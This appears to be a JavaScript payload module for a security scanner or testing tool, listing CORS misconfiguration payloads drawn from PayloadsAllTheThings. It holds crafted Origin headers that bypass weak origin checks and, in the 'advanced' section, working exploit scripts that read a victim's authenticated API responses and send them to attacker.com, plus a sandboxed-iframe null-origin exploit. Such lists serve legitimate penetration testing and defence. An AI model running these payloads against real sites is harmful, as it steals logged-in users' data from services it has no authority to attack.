/**
 * CORS Misconfiguration Payload Module
 * Reference: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration
 *
 * Categories: basic, advanced, filter_bypass, context_header
 */

const payloads = [
    // ── BASIC ──────────────────────────────────────────────────────────────────
    {
        type: "basic",
        payload: "Origin: https://evil.com",
        description: "Arbitrary origin reflection test",
        expected_behavior: "If ACAO reflects evil.com, server trusts any origin"
    },
    {
        type: "basic",
        payload: "Origin: null",
        description: "Null origin test (sandboxed iframes, data URIs)",
        expected_behavior: "If ACAO reflects 'null', attackers can exploit via sandboxed iframe"
    },
    {
        type: "basic",
        payload: "Origin: https://attacker.com",
        description: "Second arbitrary origin test",
        expected_behavior: "Confirms origin reflection is not a one-off by testing a second domain"
    },

    // ── ADVANCED ───────────────────────────────────────────────────────────────
    {
        type: "advanced",
        payload: "<script>\nfetch('https://target.com/api/user', {credentials: 'include'})\n  .then(r => r.json())\n  .then(d => fetch('https://attacker.com/steal?data=' + JSON.stringify(d)))\n</script>",
        description: "Full CORS exploit PoC — steal authenticated API data",
        expected_behavior: "Attacker page reads victim's API response and exfiltrates it"
    },
    {
        type: "advanced",
        payload: "<script>\nvar xhr = new XMLHttpRequest();\nxhr.open('GET', 'https://target.com/api/account', true);\nxhr.withCredentials = true;\nxhr.onreadystatechange = function(){\n  if(xhr.readyState == 4){\n    new Image().src = 'https://attacker.com/log?data=' + btoa(xhr.responseText);\n  }\n};\nxhr.send();\n</script>",
        description: "CORS exploit PoC via XMLHttpRequest with credential theft",
        expected_behavior: "XHR reads data from target with cookies, sends to attacker"
    },
    {
        type: "advanced",
        payload: "<iframe sandbox=\"allow-scripts\" srcdoc=\"<script>fetch('https://target.com/api/data',{credentials:'include'}).then(r=>r.text()).then(t=>parent.postMessage(t,'*'))</script>\"></iframe>",
        description: "Null origin CORS exploit via sandboxed iframe",
        expected_behavior: "Sandboxed iframe sends Origin: null; if reflected, data is exfiltrated"
    },

    // ── FILTER BYPASS ──────────────────────────────────────────────────────────
    {
        type: "filter_bypass",
        payload: "Origin: https://target.com.evil.com",
        description: "Subdomain suffix bypass — appending attacker domain",
        expected_behavior: "If server uses endsWith('target.com'), this suffix-match bypasses it"
    },
    {
        type: "filter_bypass",
        payload: "Origin: https://eviltarget.com",
        description: "Domain prefix bypass — prepending to trusted domain",
        expected_behavior: "If server uses includes('target.com'), prefix bypasses the check"
    },
    {
        type: "filter_bypass",
        payload: "Origin: https://target.com%60.evil.com",
        description: "Backtick encoding bypass in origin",
        expected_behavior: "Some parsers mishandle backtick, treating target.com as valid subdomain"
    },
    {
        type: "filter_bypass",
        payload: "Origin: https://sub.target.com",
        description: "Trusted subdomain origin — test subdomain takeover chaining",
        expected_behavior: "If subdomain is trusted and vulnerable to XSS/takeover, full CORS bypass"
    },
    {
        type: "filter_bypass",
        payload: "Origin: https://target.com_.evil.com",
        description: "Underscore delimiter bypass in origin",
        expected_behavior: "Some regex patterns don't account for underscores in domain matching"
    },

    // ── CONTEXT: HEADER ────────────────────────────────────────────────────────
    {
        type: "context_header",
        payload: "Access-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true",
        description: "Check for wildcard + credentials (invalid but sometimes seen)",
        expected_behavior: "This combination is spec-invalid; browsers block it, but misconfigured servers may still send it"
    },
    {
        type: "context_header",
        payload: "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
        description: "Overly permissive CORS methods",
        expected_behavior: "All HTTP methods allowed cross-origin, enabling CSRF-like attacks via CORS"
    },
    {
        type: "context_header",
        payload: "Access-Control-Expose-Headers: Authorization, X-Api-Key",
        description: "Sensitive headers exposed cross-origin",
        expected_behavior: "Authorization tokens readable by cross-origin JavaScript"
    },
];

module.exports = {
    vulnerability: "cors_misconfiguration",
    name: "CORS Misconfiguration",
    description: "Payloads for exploiting Cross-Origin Resource Sharing misconfigurations including origin reflection, null origin, and subdomain bypass",
    payloads,
};
